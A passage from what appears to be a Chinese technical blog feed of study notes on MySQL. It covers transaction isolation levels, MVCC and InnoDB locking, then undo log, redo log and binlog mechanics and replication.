<li class="lvl-2">
<p>read view 和 隐藏字段 : 用来判断当前版本数据的可见性。</p>
</li>
</ul>
<h2 id="1-3-并发事务挑战">1.3 并发事务挑战</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>脏读（Dirty read）：事务1对数据进行了修改，事务2读取到了修改后的数据（事务未提交），但事务1随后回滚</p>
</li>
<li class="lvl-2">
<p>丢失修改（Lost to modify）：两个事务访问同一个数据，随后都对其进行修改，第一个事务内的修改被丢失</p>
</li>
<li class="lvl-2">
<p>不可重复读（Unrepeatable read）：事务2多次读取一个数据，但事务1在两次读之间修改了该数据，导致事务2读的结果不一致</p>
</li>
<li class="lvl-2">
<p>幻读（Phantom read）：一个事务按相同的查询条件重新读取以前检索过的数据，却发现其他事务插入了满足其查询条件的新数据。在事务2两次读数据之间，事务1插入了一些数据，事务2读取到了一些本来不存在的数据。</p>
</li>
</ul>
<h3 id="1-3-1-不可重复读-vs-幻读">1.3.1 不可重复读 vs 幻读</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>不可重复读的重点是内容修改，比如多次读取一条记录发现其中某些记录的值被修改；</p>
</li>
<li class="lvl-2">
<p>幻读的重点在于记录新增或删除，比如多次执行同一条查询语句（DQL）时，发现查到的记录增加了。</p>
</li>
</ul>
<p>幻读其实可以看作是不可重复读的一种特殊情况，<mark>单独把区分幻读的原因主要是解决幻读和不可重复读的方案不一样</mark>。</p>
<p>举个例子：执行 <code>delete</code> 和 <code>update</code> 操作的时候，可以直接对记录加锁，保证事务安全。而执行 <code>insert</code> 操作的时候，由于记录锁（Record Lock）只能锁住已经存在的记录，为了避免插入新记录，需要依赖间隙锁（Gap Lock）。也就是说执行 <code>insert</code> 操作的时候需要依赖 Next-Key Lock（Record Lock+Gap Lock） 进行加锁来保证不出现幻读。</p>
<h3 id="1-3-2-解决更新丢失">1.3.2 解决更新丢失</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>方法1：使用事务+锁定读，也就是for update，</p>
</li>
<li class="lvl-2">
<p>方法2：不使用事务，用CAS自旋来操作。</p>
</li>
</ul>
<h3 id="1-3-3-解决幻读">1.3.3 解决幻读</h3>
<p>一个事务在操作某张表数据的时候，另外一个事务不允许新增或者删除这张表中的数据了。解决幻读的方式主要有以下几种：</p>
<ol>
<li class="lvl-3">
<p>将事务隔离级别调整为 <code>SERIALIZABLE</code> 。</p>
</li>
<li class="lvl-3">
<p>在可重复读的事务级别下，给事务操作的这张表添加表锁。</p>
</li>
<li class="lvl-3">
<p>在可重复读的事务级别下，给事务操作的这张表添加 <code>Next-key Lock（Record Lock+Gap Lock）</code></p>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403261953048.png" alt="image.png"></p>
<h3 id="1-3-4-并发事务控制">1.3.4 并发事务控制</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>共享锁（读锁，S锁）</p>
</li>
<li class="lvl-2">
<p>排他锁（写锁，X锁）</p>
</li>
</ul>
<h2 id="1-4-事务隔离级别">1.4 事务隔离级别</h2>
<blockquote>
<p>MVCC：实现不同事务隔离级别<br>
MySQL 的隔离级别基于锁和 MVCC 机制共同实现的。<br>
SERIALIZABLE 隔离级别是通过锁来实现的，READ-COMMITTED 和 REPEATABLE-READ 隔离级别是基于 MVCC 实现的。不过， SERIALIZABLE 之外的其他隔离级别可能也需要用到锁机制，就比如 REPEATABLE-READ 在当前读情况下需要使用加锁读来保证不会出现幻读。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> TRANSACTION ISOLATION LEVEL X</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>READ UNCOMMITTED（读未提交数据）：事务中的修改，即使没有提交，对其他事务也都是可见的。事务可以读取未提交的数据，这也被称为脏读（Dirty Read）。</p>
</li>
<li class="lvl-3">
<p>READ COMMITTED（读提交数据）：允许事务读已提交的数据，但不要求“可重复读”。</p>
</li>
<li class="lvl-3">
<p>REPEATABLE READ（可重复读）：只许事务读已提交的数据，且两次读之间不许其他事务修改此数据。事务可以不可串行化。</p>
</li>
<li class="lvl-2">
<p>SERIALIZABLE（可串行化）：允许事务并发执行，但须保证并发调度可串行化。会对记录加上读写锁，在多个事务对这条记录进行读写操作时，如果发生了读写冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行；</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody>
<tr>
<td>读未提交</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>读取已提交</td>
<td></td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>可重复读</td>
<td></td>
<td></td>
<td>√</td>
</tr>
<tr>
<td>可串行化</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody>
</table>
<p>MySQL 的隔离级别基于锁和 MVCC 机制共同实现的。</p>
<p>SERIALIZABLE 隔离级别是通过锁来实现的，<strong>READ-COMMITTED 和 REPEATABLE-READ 隔离级别是基于 MVCC 实现的</strong>。不过， SERIALIZABLE 之外的其他隔离级别可能也需要用到锁机制，就比如 REPEATABLE-READ 在当前读情况下需要使用加锁读来保证不会出现幻读。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>对于「读未提交」隔离级别的事务来说，因为可以读到未提交事务修改的数据，所以直接读取最新的数据就好了；</p>
</li>
<li class="lvl-2">
<p>对于「串行化」隔离级别的事务来说，通过加读写锁的方式来避免并行访问；</p>
</li>
<li class="lvl-2">
<p>对于「读提交」和「可重复读」隔离级别的事务来说，通过 <strong>Read View 来实现的，它们的区别在于创建 Read View 的时机不同， Read View 理解成一个数据快照。</strong>「读提交」隔离级别是在「每个语句执行前」都会重新生成一个 Read View，而「可重复读」隔离级别是「启动事务时」生成一个 Read View，然后整个事务期间都在用这个 Read View。「读提交」隔离级别是在「每个select语句执行前」都会重新生成一个 Read View； 「可重复读」隔离级别是执行第一条select时，生成一个 Read View，然后整个事务期间都在用这个 Read View。</p>
</li>
</ul>
<h3 id="1-4-1-读提交和可重复读">1.4.1 读提交和可重复读</h3>
<p>对于「读提交」和「可重复读」隔离级别的事务来说，它们是通过 Read View 来实现的，它们的区别在于创建 Read View 的时机不同：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>「读提交」隔离级别是在每个 select 都会生成一个新的 Read View，也意味着，事务期间的多次读取同一条数据，前后两次读的数据可能会出现不一致，因为可能这期间另外一个事务修改了该记录，并提交了事务。</p>
</li>
<li class="lvl-2">
<p>「可重复读」隔离级别是启动事务时生成一个 Read View，然后整个事务期间都在用这个 Read View，这样就保证了在事务期间读到的数据都是事务启动前的记录。</p>
</li>
</ul>
<p>这两个隔离级别实现是通过「事务的 Read View 里的字段」和「记录中的两个隐藏列」的比对，来控制并发事务访问同一个记录时的行为，这就叫 MVCC（多版本并发控制）。</p>
<p>在可重复读隔离级别中，普通的 select 语句就是基于 MVCC 实现的快照读，也就是不会加锁的。而 select … for update 语句就不是快照读了，而是当前读了，也就是每次读都是拿到最新版本的数据，但是它会对读到的记录加上 next-key lock 锁。</p>
<h3 id="1-4-2-可重复度">1.4.2 可重复度</h3>
<p>在 MySQL 的可重复读隔离级别下，针对当前读的语句会对索引加记录锁+间隙锁，这样可以避免其他事务执行增、删、改时导致幻读的问题。</p>
<p>有一点要注意的是，在执行 update、delete、select … for update 等具有加锁性质的语句，检查语句是否走了索引；未走索引是全表扫描，会对每一个索引加 next-key 锁，相当于把整个表锁住了，这是挺严重的问题。</p>
<h2 id="1-5-锁">1.5 锁</h2>
<table>
<thead>
<tr>
<th></th>
<th>表级锁</th>
<th>行级锁</th>
</tr>
</thead>
<tbody>
<tr>
<td>MyISAM</td>
<td>√</td>
<td></td>
</tr>
<tr>
<td>InnoDB</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>InnoDB 的行锁是针对索引字段加的锁，表级锁是针对非索引字段加的锁。</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="1-5-1-InnoDB行锁种类">1.5.1 InnoDB行锁种类</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>记录锁（Record Lock）</strong>：也被称为记录锁，属于单个行记录上的锁。</p>
</li>
<li class="lvl-2">
<p><strong>间隙锁（Gap Lock）</strong>：锁定一个范围，不包括记录本身。</p>
</li>
<li class="lvl-2">
<p><strong>临键锁（Next-Key Lock）</strong>：Record Lock+Gap Lock，锁定一个范围，包含记录本身，主要目的是为了解决幻读问题（MySQL 事务部分提到过）。记录锁只能锁住已经存在的记录，为了避免插入新记录，需要依赖间隙锁。</p>
</li>
</ul>
<h2 id="1-6-InnoDB默认隔离级别">1.6 InnoDB默认隔离级别</h2>
<p>InnoDB存储引擎的默认事务隔离级别是“可重复读”（REPEATABLE READ）。在这个级别下，事务在开始时创建一个快照，事务内的查询都是基于这个快照进行的，因此可以确保在整个事务过程中读取到的数据是一致的，即使其他事务在此期间修改了数据。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404161702594.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>m_ids ：指的是在创建 Read View 时，当前数据库中「活跃事务」的<strong>事务 id 列表</strong>，注意是一个列表，<strong>“活跃事务”指的就是，启动了但还没提交的事务</strong>。</p>
</li>
<li class="lvl-2">
<p>min_trx_id ：指的是在创建 Read View 时，当前数据库中「活跃事务」中事务 <strong>id 最小的事务</strong>，也就是 m_ids 的最小值。</p>
</li>
<li class="lvl-2">
<p>max_trx_id ：这个并不是 m_ids 的最大值，而是<strong>创建 Read View 时当前数据库中应该给下一个事务的 id 值</strong>，也就是全局事务中最大的事务 id 值 + 1；</p>
</li>
<li class="lvl-2">
<p>creator_trx_id ：指的是<strong>创建该 Read View 的事务的事务 id</strong>。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404161702857.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>trx_id，当一个事务对某条聚簇索引记录进行改动时，就会<strong>把该事务的事务 id 记录在 trx_id 隐藏列里</strong>；</p>
</li>
<li class="lvl-2">
<p>roll_pointer，每次对某条聚簇索引记录进行改动时，都会把旧版本的记录写入到 undo 日志中，然后<strong>这个隐藏列是个指针，指向每一个旧版本记录</strong>，于是就可以通过它找到修改前的记录。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405141731477.png" alt="image.png"><br>
一个事务去访问记录的时候，除了自己的更新记录总是可见之外，还有这几种情况：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果记录的 trx_id 值小于 Read View 中的 <code>min_trx_id</code> 值，表示这个版本的记录是在创建 Read View <strong>前</strong>已经提交的事务生成的，所以该版本的记录对当前事务<strong>可见</strong>。</p>
</li>
<li class="lvl-2">
<p>如果记录的 trx_id 值大于等于 Read View 中的 <code>max_trx_id</code> 值，表示这个版本的记录是在创建 Read View <strong>后</strong>才启动的事务生成的，所以该版本的记录对当前事务<strong>不可见</strong>。</p>
</li>
<li class="lvl-2">
<p>如果记录的 trx_id 值在 Read View 的 <code>min_trx_id</code> 和 <code>max_trx_id</code> 之间，需要判断 trx_id 是否在 m_ids 列表中：</p>
<ul class="lvl-2">
<li class="lvl-6">如果记录的 trx_id <strong>在</strong> <code>m_ids</code> 列表中，表示生成该版本记录的活跃事务依然活跃着（还没提交事务），所以该版本的记录对当前事务<strong>不可见</strong>。</li>
<li class="lvl-6">如果记录的 trx_id <strong>不在</strong> <code>m_ids</code>列表中，表示生成该版本记录的活跃事务已经被提交，所以该版本的记录对当前事务<strong>可见</strong>。</li>
</ul>
</li>
</ul>
<p><strong>这种通过「版本链」来控制并发事务访问同一个记录时的行为就叫 MVCC（多版本并发控制）。</strong></p>
<h2 id="1-7-InnoDB解决幻读">1.7 InnoDB解决幻读</h2>
<p>幻读是指在同一个事务中多次执行相同的查询，但由于其他事务的插入操作，导致结果集不一致的现象。InnoDB引擎通过多版本并发控制（MVCC）和间隙锁（Gap Locks）来解决幻读问题。在可重复读隔离级别下，InnoDB使用MVCC来保持事务内数据的一致性视图。同时，InnoDB的间隙锁可以防止其他事务在已锁定范围的间隙中插入新的数据，从而确保在事务范围内不会出现新的、未被锁定的行，这样就解决了幻读问题。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>针对<strong>快照读</strong>（普通 select 语句），是<strong>通过 MVCC 方式解决了幻读</strong>，因为可重复读隔离级别下，事务执行过程中看到的数据，一直跟这个事务启动时看到的数据是一致的，即使中途有其他事务插入了一条数据，是查询不出来这条数据的，所以就很好了避免幻读问题。</p>
</li>
<li class="lvl-2">
<p>针对<strong>当前读</strong>（select … for update 等语句），是<strong>通过 next-key lock（记录锁+间隙锁）方式解决了幻读</strong>，因为当执行 select … for update 语句的时候，会加上 next-key lock，如果有其他事务在 next-key lock 锁范围内插入了一条记录，那么这个插入语句就会被阻塞，无法成功插入，所以就很好了避免幻读问题。</p>
</li>
</ul>
<p>select for update的含义是在查询数据的同时对所选的数据行进行锁定，以保证数据的一致性和并发控制。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404201035064.png" alt="image.png"></p>
<h2 id="1-8-当前读无法避免幻读情景">1.8 当前读无法避免幻读情景</h2>
<p>MySQL 里除了普通查询是快照读，其他都是<strong>当前读</strong>，比如 update、insert、delete，这些语句执行前都会查询最新版本的数据，然后再做进一步的操作。</p>
<h3 id="1-8-1-场景1">1.8.1 场景1</h3>
<p>当事务 A 更新了一条事务 B 插入的记录<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405141749889.png" alt="image.png"><br>
在可重复读隔离级别下，事务 A 第一次执行普通的 select 语句时生成了一个 ReadView，之后事务 B 向表中新插入了一条 id = 5 的记录并提交。接着，事务 A 对 id = 5 这条记录进行了更新操作，在这个时刻，这条新记录的 trx_id 隐藏列的值就变成了事务 A 的事务 id，之后事务 A 再使用普通 select 语句去查询这条记录时就可以看到这条记录了，于是就发生了幻读。</p>
<h3 id="1-8-2-场景2">1.8.2 场景2</h3>
<blockquote>
<p>对于当前读，如果事务开启后，并没有执行当前读，而是先快照读，然后这期间如果其他事务插入了一条记录，那么事务后续使用当前读进行查询的时候，就会发现两次查询的记录条目就不一样了，所以就发生幻读。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>T1 时刻：事务 A 先执行「快照读语句」：select * from t_test where id &gt; 100 得到了 3 条记录。</p>
</li>
<li class="lvl-2">
<p>T2 时刻：事务 B 往插入一个 id= 200 的记录并提交；</p>
</li>
<li class="lvl-2">
<p>T3 时刻：事务 A 再执行「当前读语句」 select * from t_test where id &gt; 100 for update 就会得到 4 条记录，此时也发生了幻读现象。</p>
</li>
</ul>
<p>要避免这类特殊场景下发生幻读的现象的话，就是尽量在开启事务之后，马上执行 select … for update 这类当前读的语句，因为它会<strong>对记录加 next-key lock，从而避免其他事务插入一条新记录</strong>。</p>
<p><a href="https://xiaolincoding.com/mysql/transaction/phantom.html#%E4%BB%80%E4%B9%88%E6%98%AF%E5%B9%BB%E8%AF%BB">MySQL 可重复读隔离级别，完全解决幻读了吗？ | 小林coding (xiaolincoding.com)</a><br>
<a href="https://blog.csdn.net/lsoxvxe/article/details/132506907">深入理解select for update的含义和锁机制-CSDN博客</a></p>
<h2 id="1-9-当前读-vs-快照读">1.9 当前读 vs 快照读</h2>
<p>MVCC机制实现了快照读，普通select 查询就是快照读，快照读到数据有可能不是最新的数据，它主要是为了实现可重复读的事务隔离级别。</p>
<p>当前读：读取的是最新的数据版本，当我们使用UPDATE、DELETE、INSERT、SELECT … LOCK IN SHARE MODE、SELECT … FOR UPDATE 是当前读。当前读就是加了锁的增删改查语句。</p>
<blockquote>
<p>[!note] MVCC 有没有解决幻读的问题？</p>
</blockquote>
<p>在快照读的情况下，InnoDB通过MVCC机制解决了幻读现象；但是在当前读的情况下，InnoDB是无法通过MVCC解决幻读的现象，因为它每次读取的都是最新的数据。</p>
<p><a href="https://blog.csdn.net/weixin_44844089/article/details/115532014">数据库面试题：mysql当前读和快照读（MVCC）_当前读和快照读 面试-CSDN博客</a><br>
<a href="https://cloud.tencent.com/developer/article/1986859">MySQL 高频面试题解析 第02期：当前读和快照读的区别-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<h1>2 参考</h1>
<p><a href="https://cloud.tencent.com/developer/article/1983907">MySQL 事务并发带来的问题以及其解决方案分析-腾讯云开发者社区-腾讯云 (tencent.com)</a><br>
<a href="https://juejin.cn/post/7152765784299667487#heading-25">(七)MySQL事务篇：ACID原则、事务隔离级别及事务机制原理剖析 - 掘金 (juejin.cn)</a><br>
<a href="https://blog.csdn.net/weixin_44844089/article/details/115532014">mysql当前读和快照读（MVCC）_当前读和快照读 面试-CSDN博客</a><br>
<a href="https://javaguide.cn/database/mysql/mysql-logs.html">MySQL三大日志(binlog、redo log和undo log)详解 | JavaGuide</a><br>
<a href="https://javaguide.cn/database/mysql/transaction-isolation-level.html">MySQL事务隔离级别详解 | JavaGuide</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL(3)：日志</title>
    <url>/2024/04/18/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL(3)%EF%BC%9A%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h1>1 日志</h1>
<p><code>MySQL</code> 日志 主要包括错误日志、查询日志、慢查询日志、事务日志、二进制日志几大类。其中，比较重要的还要属二进制日志 <code>binlog</code>（归档日志）和事务日志 <code>redo log</code>（重做日志）和 <code>undo log</code>（回滚日志）、慢查询日志。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404221134747.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>undo log（回滚日志）</strong>：是 Innodb 存储引擎层生成的日志，实现了事务中的<strong>原子性</strong>，主要<strong>用于事务回滚和 MVCC</strong>。</p>
</li>
<li class="lvl-2">
<p><strong>redo log（重做日志）</strong>：是 Innodb 存储引擎层生成的日志，实现了事务中的<strong>持久性</strong>，主要<strong>用于掉电等故障恢复</strong></p>
</li>
<li class="lvl-2">
<p><strong>binlog （归档日志）</strong>：是 Server 层生成的日志，主要<strong>用于数据备份和主从复制</strong>；</p>
</li>
</ul>
<h1>2 Buffer pool(缓冲池)</h1>
<p>MySQL 中数据是以页为单位，你查询一条记录，会从硬盘把一页的数据加载出来，加载出来的数据叫数据页，会放入到 <code>Buffer Pool</code> 中。</p>
<p>在 MySQL 启动的时候，<strong>InnoDB 会为 Buffer Pool 申请一片连续的内存空间，然后按照默认的<code>16KB</code>的大小划分出一个个的页， Buffer Pool 中的页就叫做缓存页</strong>。此时这些缓存页都是空闲的，之后随着程序的运行，才会有磁盘上的页被缓存到 Buffer Pool 中。</p>
<p>Buffer Pool 除了缓存「索引页」和「数据页」，还包括了 Undo 页，插入缓存、自适应哈希索引、锁信息等等。</p>
<h1>3 undo log(回滚日志)</h1>
<p>保证事务的原子性，就需要在异常发生时，对已经执行的操作进行<strong>回滚</strong>，在 MySQL 中，恢复机制是通过 <strong>回滚日志（undo log）</strong> 实现的，所有事务进行的修改都会先记录到这个回滚日志中，然后再执行相关的操作。如果执行过程中遇到异常的话，我们直接利用 <strong>回滚日志</strong> 中的信息将数据回滚到修改之前的样子即可！</p>
<p>undo log 是一种用于撤销回退的日志。在事务没提交之前，MySQL 会先记录更新前的数据到 undo log 日志文件里面，当事务回滚时，可以利用 undo log 来进行回滚。</p>
<p>另外，<mark>undo log 还有一个作用，通过 ReadView + undo log 实现 MVCC（多版本并发控制）</mark>。</p>
<p>对于「读提交」和「可重复读」隔离级别的事务来说，它们的快照读（普通 select 语句）是通过 Read View + undo log 来实现的，它们的区别在于创建 Read View 的时机不同</p>
<p>因此，undo log 两大作用：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>实现事务回滚，保障事务的原子性</strong>。事务处理过程中，如果出现了错误或者用户执行了 ROLLBACK 语句，MySQL 可以利用 undo log 中的历史数据将数据恢复到事务开始之前的状态。</p>
</li>
<li class="lvl-2">
<p><strong>实现 MVCC（多版本并发控制）关键因素之一</strong>。MVCC 是通过 ReadView + undo log 实现的。undo log 为每条记录保存多份历史数据，MySQL 在执行快照读（普通 select 语句）的时候，会根据事务的 Read View 里的信息，顺着 undo log 的版本链找到满足其可见性的记录。</p>
</li>
</ul>
<h1>4 redo log(重做日志)</h1>
<blockquote>
<p>在某个数据页做了什么修改每条 redo 记录由“表空间号+数据页号+偏移量+修改数据长度+具体修改的数据”组成</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405142106862.png" alt="image.png"></p>
<p>为了防止断电导致数据丢失的问题，当有一条记录需要更新的时候，InnoDB 引擎就会先更新内存（同时标记为脏页），然后将本次对这个页的修改以 redo log 的形式记录下来，这个时候更新就算完成。</p>
<p>后续，InnoDB 引擎会在适当的时候，由后台线程将缓存在 Buffer Pool 的脏页刷新到磁盘里，这就是 <mark>WAL （Write-Ahead Logging）技术</mark>。</p>
<p><strong>WAL 技术指的是， MySQL 的写操作并不是立刻写到磁盘上，而是先写日志，然后在合适的时间再写到磁盘上</strong>。</p>
<p>在事务提交时，只要先将 redo log 持久化到磁盘即可，可以不需要等到将缓存在 Buffer Pool 里的脏页数据持久化到磁盘。</p>
<p>当系统崩溃时，虽然脏页数据没有持久化，但是 redo log 已经持久化，接着 MySQL 重启后，可以根据 redo log 的内容，将所有数据恢复到最新的状态。</p>
<p><code>redo log</code>（重做日志）是<code>InnoDB</code>存储引擎独有的，它让<code>MySQL</code>拥有了崩溃恢复能力。重启时，<code>InnoDB</code>存储引擎会使用<code>redo log</code>恢复数据，保证数据的持久性与完整性。</p>
<p>每条 redo 记录由“<strong>表空间号+数据页号+偏移量+修改数据长度+具体修改的数据</strong>”组成。<br>
<code>redo log</code> 它是<mark>物理日志</mark>，记录内容是“在某个数据页上做了什么修改”，属于 <code>InnoDB</code> 存储引擎。</p>
<h2 id="4-1-刷盘时机">4.1 刷盘时机</h2>
<p><code>innodb_flush_log_at_trx_commit</code> 的值有 3 种，也就是共有 3 种刷盘策略：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>0</strong>：设置为 0 的时候，表示每次事务提交时不进行刷盘操作。这种方式性能最高，但是也最不安全，因为如果 MySQL 挂了或宕机了，可能会丢失最近 1 秒内的事务。</p>
</li>
<li class="lvl-2">
<p><strong>1</strong>：设置为 1 的时候，表示每次事务提交时都将进行刷盘操作。这种方式性能最低，但是也最安全，因为只要事务提交成功，redo log 记录就一定在磁盘里，不会有任何数据丢失。</p>
</li>
<li class="lvl-2">
<p><strong>2</strong>：设置为 2 的时候，表示每次事务提交时都只把 log buffer 里的 redo log 内容写入 page cache（文件系统缓存）。page cache 是专门用来缓存文件的，这里被缓存的文件就是 redo log 文件。这种方式的性能和安全性都介于前两者中间。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405201454540.png" alt="image.png"></p>
<h2 id="4-2-redo-log和undo-log">4.2 redo log和undo log</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>redo log 记录了此次事务「<strong>完成后</strong>」的数据状态，记录的是更新<strong>之后</strong>的值；</p>
</li>
<li class="lvl-2">
<p>undo log 记录了此次事务「<strong>开始前</strong>」的数据状态，记录的是更新<strong>之前</strong>的值；</p>
</li>
</ul>
<blockquote>
<p>[!note]<br>
redo log 要写到磁盘，数据也要写磁盘，为什么要多此一举？写入 redo log 的方式使用了追加操作， 所以磁盘操作是<strong>顺序写</strong>，而写入数据需要先找到写入位置，然后才写到磁盘，所以磁盘操作是<strong>随机写</strong>。</p>
<ul class="lvl-1">
<li class="lvl-2"><strong>实现事务的持久性，让 MySQL 有 crash-safe 的能力</strong>，能够保证 MySQL 在任何时间段突然崩溃，重启后之前已提交的记录都不会丢失；</li>
<li class="lvl-2"><strong>将写操作从「随机写」变成了「顺序写」</strong>，提升 MySQL 写入磁盘的性能。</li>
</ul>
</blockquote>
<h2 id="4-3-redo-log何时写入磁盘">4.3 redo log何时写入磁盘</h2>
<p>执行一个事务的过程中，产生的 redo log 也不是直接写入磁盘的，因为这样会产生大量的 I/O 操作，而且磁盘的运行速度远慢于内存。</p>
<p>所以，redo log 也有自己的缓存—— <strong>redo log buffer</strong>，每当产生一条 redo log 时，会先写入到 redo log buffer，后续在持久化到磁盘</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>MySQL 正常关闭时；</p>
</li>
<li class="lvl-2">
<p>当 redo log buffer 中记录的写入量大于 redo log buffer 内存空间的一半时，会触发落盘；</p>
</li>
<li class="lvl-2">
<p>InnoDB 的后台线程每隔 1 秒，将 redo log buffer 持久化到磁盘。</p>
</li>
<li class="lvl-2">
<p>每次事务提交时都将缓存在 redo log buffer 里的 redo log 直接持久化到磁盘</p>
</li>
</ul>
<h1>5 binlog(归档日志)</h1>
<p><code>binlog</code>是逻辑日志，会记录所有涉及更新数据的逻辑操作，所有数据库表结构变更和表数据修改的日志，并且是顺序写，不会记录查询类的操作。</p>
<p>记录格式</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>statement</strong>：记录SQL语句原文</p>
</li>
<li class="lvl-2">
<p><strong>row</strong>：当更新时间为now()时，不能使用SQL原文，记录包含操作的具体数据</p>
</li>
<li class="lvl-2">
<p><strong>mixed</strong>：MySQL 会判断这条<code>SQL</code>语句是否可能引起数据不一致，如果是，就用<code>row</code>格式，否则就用<code>statement</code>格式。</p>
</li>
</ul>
<h2 id="5-1-redo-log-和-binlog-有什么区别？">5.1 redo log 和 binlog 有什么区别？</h2>
<p>这两个日志有四个区别。</p>
<p><em>1、适用对象不同：</em></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>binlog 是 MySQL 的 Server 层实现的日志，所有存储引擎都可以使用；</p>
</li>
<li class="lvl-2">
<p>redo log 是 Innodb 存储引擎实现的日志；</p>
</li>
</ul>
<p><em>2、文件格式不同：</em></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>binlog 有 3 种格式类型，分别是 STATEMENT（默认格式）、ROW、 MIXED，区别如下：</p>
<ul class="lvl-2">
<li class="lvl-6">STATEMENT：每一条修改数据的 SQL 都会被记录到 binlog 中（相当于记录了逻辑操作，所以针对这种格式， binlog 可以称为逻辑日志），主从复制中 slave 端再根据 SQL 语句重现。但 STATEMENT 有<mark>动态函数</mark>的问题，比如你用了 uuid 或者 now 这些函数，你在主库上执行的结果并不是你在从库执行的结果，这种随时在变的函数会导致复制的数据不一致；</li>
<li class="lvl-6">ROW：记录行数据最终被修改成什么样了（这种格式的日志，就不能称为逻辑日志了），不会出现 STATEMENT 下<code>动态函数</code>的问题。但 ROW 的缺点是每行数据的变化结果都会被记录，比如执行批量 update 语句，更新多少行数据就会产生多少条记录，使 binlog 文件过大，而在 STATEMENT 格式下只会记录一个 update 语句而已；</li>
<li class="lvl-6">MIXED：包含了 STATEMENT 和 ROW 模式，它会根据不同的情况自动使用 ROW 模式和 STATEMENT 模式；</li>
</ul>
</li>
<li class="lvl-2">
<p>redo log 是物理日志，记录的是在某个数据页做了什么修改，比如对 XXX 表空间中的 YYY 数据页 ZZZ 偏移量的地方做了AAA 更新；</p>
</li>
</ul>
<p><em>3、写入方式不同：</em></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><mark>binlog 是追加写</mark>，写满一个文件，就创建一个新的文件继续写，不会覆盖以前的日志，保存的是全量的日志。</p>
</li>
<li class="lvl-2">
<p><mark>redo log 是循环写</mark>，日志空间大小是固定，全部写满就从头开始，保存未被刷入磁盘的脏页日志。</p>
</li>
</ul>
<p><em>4、用途不同：</em></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>binlog 用于<strong>备份恢复、主从复制</strong>；</p>
</li>
<li class="lvl-2">
<p>redo log 用于掉电等故障恢复。</p>
</li>
</ul>
<blockquote>
<p>[!note]  如果不小心整个数据库的数据被删除了，能使用 redo log 文件恢复数据吗？不可以使用 redo log 文件恢复，只能使用 binlog 文件恢复。因为 redo log 文件是循环写，是会边写边擦除日志的，只记录未被刷入磁盘的数据的物理日志，已经刷入磁盘的数据都会从 redo log 文件里擦除。<br>
binlog 文件保存的是全量的日志，也就是保存了所有数据变更的情况，理论上只要记录在 binlog 上的数据，都可以恢复，所以如果不小心整个数据库的数据被删除了，得用 binlog 文件恢复数据。</p>
</blockquote>
<h2 id="5-2-主从复制">5.2 主从复制</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>写入 Binlog</strong>：主库写 binlog 日志，提交事务，并更新本地存储数据。</p>
</li>
<li class="lvl-2">
<p><strong>同步 Binlog</strong>：把 binlog 复制到所有从库上，每个从库把 binlog 写到暂存日志中。</p>
</li>
<li class="lvl-2">
<p><strong>回放 Binlog</strong>：回放 binlog，并更新存储引擎中的数据。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202410221110795.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>MySQL 主库在收到客户端提交事务的请求之后，会先写入 binlog，再提交事务，更新存储引擎中的数据，事务提交完成后，返回给客户端“操作成功”的响应。</p>
</li>
<li class="lvl-2">
<p>从库会创建一个专门的 <code>I/O 线程</code>，连接主库的 <code>log dump 线程</code>，来接收主库的 binlog 日志，再把 binlog 信息写入 relay log 的<mark>中继日志</mark>里，再返回给主库“复制成功”的响应。</p>
